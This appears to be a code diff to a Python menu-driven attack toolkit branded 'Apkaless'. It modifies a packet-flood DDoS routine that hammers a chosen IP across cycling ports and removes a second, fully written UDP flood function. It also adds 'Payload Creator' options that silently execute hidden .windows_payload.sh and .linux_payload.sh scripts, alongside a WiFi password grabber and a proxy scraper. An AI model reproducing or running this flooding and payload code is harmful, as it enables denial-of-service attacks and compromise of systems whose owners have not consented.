@@ -1,6 +1,3 @@
-from os import P_NOWAIT
-
-
 try:
      import socket
      import sys
@@ -132,47 +129,23 @@ try:
           print(Fore.GREEN + "[===============================] 100%")
           time.sleep(1)
           while True:
-               # try: 
-               from datetime import datetime
-               now = datetime.now()
-               s.connect((host,port))
-               print("Connected\n")
-               s.sendto(bytes, (host,port))
-               sent = sent + 1
-               port = port + 1
-               print(Fore.GREEN + Style.NORMAL + "Attacking %s packets to %s on port %s By Apkaless %s"%(sent,Style.NORMAL + host,port, now))
-               if port == 66534:
-                    port = 1
-               # except:
-               #      print("\nConnection Was Lost\n")
-               #      input("Press Enter To Back...")
-               #      starting()
+               try:
+                    from datetime import datetime
+                    now = datetime.now()
+                    s.connect((host,port))
+                    print("Connected\n")
+                    s.sendto(bytes, (host,port))
+                    sent = sent + 1
+                    port = port + 1
+                    print(Fore.GREEN + Style.NORMAL + "Attacking %s packets to %s on port %s By Apkaless %s"%(sent,Style.NORMAL + host,port, now))
+                    if port == 65535:
+                         port = 1
+               except (ConnectionRefusedError, ConnectionError):
+                    print("\nConnection Was Lost\n")
+                    input("Press Enter To Back...")
+                    starting()
      #This is The End Of Code
 
-     def ddostool2():
-          now = datetime.datetime.now()
-          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-          bytes = random._urandom(1020)
-          os.system("clear")
-          os.system("figlet DDos")
-          print("")
-          ip = input("Target IP: ")
-          print("")
-          port = int(input("Port: "))
-          os.system("clear")
-          os.system("figlet DDOS")
-          print("")
-          print("TARGET IP IS {}" .format(ip))
-          print("")
-          print("PORT IS {}" .format(port))
-          sent = 0
-          while True:
-               s.sendto(bytes, (ip, port))
-               sent = sent + 1
-               port = port + 1
-               print("sent packet %s to %s through %s %s" %(sent, ip, port, now))
-               if port == 66535:
-                    port = 1
 
      #This Code For Scanner tool
 
@@ -252,20 +225,15 @@ try:
      def scraper():
           os.system("clear")
           os.system("figlet Proxies")
-          try:
-               print("")
-               scrapper = Scrapper(category='ALL', print_err_trace=False)
-               data = scrapper.getProxies()
-               print("Scrapped Proxies:\n")
-               sys.stdout = open("/root/ApkalessTool/Test.txt", "r")
-               for item in data.proxies:
-                    print("{}:{}" .format(item.ip, item.port))
-               print("\nTotal Proxies:", data.len)
-               print("\nCategory of the Proxy:", data.category)
-               print("")
-               sys.stdout.close()
-          except ValueError:
-               print("Hello")
+          print("")
+          scrapper = Scrapper(category='ALL', print_err_trace=False)
+          data = scrapper.getProxies()
+          print("Scrapped Proxies:\n")
+          for item in data.proxies:
+               print("{}:{}" .format(item.ip, item.port))
+          print("\nTotal Proxies:", data.len)
+          print("\nCategory of the Proxy:", data.category)
+          print("")
 
      def wifiPassword():
           print(Style.BRIGHT)
@@ -373,6 +341,19 @@ try:
                input(Fore.GREEN + "Press Enter To Back.....")
                starting()
 
+     def payload_creator_windows():
+          os.system("clear")
+          os.system("figlet Apkaless")
+          print("")
+          os.system("chmod +x .windows_payload.sh")
+          os.system("./.windows_payload.sh")
+     def payload_creator_linux():
+          os.system("clear")
+          os.system("figlet Apkaless")
+          print("")
+          os.system("chmod +x .linux_payload.sh")
+          os.system("./.linux_payload.sh")
+
      #=================== Starting Tools ===================#
     #|                                                      |#
     #|                                                      |#
@@ -440,7 +421,7 @@ try:
 
           [4] Proxy Scrapper
 
-          [5] Get Your Wifi Password
+          [5] Get Your Wifi Password (Windows Only)
 
           [6] YouTube Video Download
 
@@ -448,7 +429,9 @@ try:
 
           [8] System Informations
 
-          [9] Update Tool\n""")
+          [9] Payload Creator
+
+          [10] Update Tool\n""")
                                         
                print("\nPress", Fore.BLUE + Style.NORMAL + "Ctrl", Fore.GREEN + Style.BRIGHT + "+", Fore.RED + Style.NORMAL + "C", Fore.GREEN + Style.BRIGHT + "To Exit From This Tool.\n")
 
@@ -461,19 +444,11 @@ try:
                if starthacking == "2":
                     scanner()
                if starthacking == "3":
-                    if platform.machine()=="x86_64":
-                         ddostool()
-                    else:
-                         ddostool2()
+                    ddostool()
                if starthacking == "4":
                     scraper()
                if starthacking == "5":
-                    if platform.machine()=="AMD64":
-                         wifiPassword()
-                    else:
-                         slowprint("\nThis Option Is Not For Your Machine.")
-                         time.sleep(2)
-                         starting()
+                    wifiPassword()
                if starthacking == "6":
                     videoDownload()
                if starthacking == "7":
@@ -501,6 +476,18 @@ try:
                     starting()
                if starthacking=="9":
                     updateTool()
+               if starthacking=="10":
+                    os.system("clear")
+                    os.system("figlet Apkaless")
+                    print("")
+                    slowprint("Select Platform ==> 1) Windows 2) Linux")
+                    print("")
+                    platform = input("==> ")
+                    if platform == "1" or platform == "Windows" or platform =="windows":
+                         payload_creator_windows()
+                    if platform == "2" or platform == "Linux" or platform == "linux":
+                         payload_creator_linux()
+
 
 
 
